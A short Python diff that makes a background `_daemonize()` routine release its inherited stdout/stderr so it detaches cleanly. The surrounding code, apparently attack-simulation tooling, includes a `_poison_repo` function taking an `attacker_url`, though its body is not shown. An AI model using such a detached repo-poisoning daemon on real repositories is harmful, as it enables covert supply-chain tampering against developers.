@@ -30,6 +30,17 @@ def _daemonize() -> None:
     if os.fork() > 0:
         os._exit(0)
     os.setsid()
+    # Release every inherited file descriptor, stdout/stderr especially: the
+    # process that launched us captures those, and a daemon that kept them open
+    # would hold the launcher's read blocking until this 30s daemon exited.
+    devnull = os.open(os.devnull, os.O_RDWR)
+    for fd in (0, 1, 2):
+        try:
+            os.dup2(devnull, fd)
+        except OSError:
+            pass
+    if devnull > 2:
+        os.close(devnull)
 
 
 def _poison_repo(git_dir: str, origin_url: str, attacker_url: str) -> None:
